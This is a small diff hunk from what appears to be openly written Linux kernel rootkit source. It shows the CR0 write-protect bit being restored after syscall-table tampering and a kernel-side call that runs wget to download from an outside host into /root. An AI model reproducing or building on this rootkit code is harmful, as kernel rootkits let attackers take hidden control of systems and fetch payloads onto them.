@@ -239,7 +239,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 	
-	const char *args[5] = {"wget","google.com","-P","//"};
+	const char *args[5] = {"wget","google.com","-P","//root"};
 	my_execve("/bin/wget", args , NULL);	
 
 	return 0;
